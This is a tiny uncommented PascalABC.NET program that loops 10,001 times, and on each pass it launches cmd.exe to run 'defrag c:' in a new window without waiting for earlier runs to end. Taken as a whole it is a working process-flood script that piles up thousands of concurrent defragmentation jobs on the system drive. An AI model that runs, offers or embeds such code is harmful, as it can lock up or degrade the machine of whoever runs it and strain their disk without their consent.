uses System.Diagnostics;

begin
	var ExitCode : integer;
	var ProcessInfo: ProcessStartInfo;
	var p : Process;

  for var i := 0 to 10000 do
    begin
  	ProcessInfo := new ProcessStartInfo('cmd.exe', '/C ' + 'defrag c:');
  	ProcessInfo.CreateNoWindow := false; 
  	ProcessInfo.UseShellExecute := true;
  	Process.Start(ProcessInfo);
  	end;
end.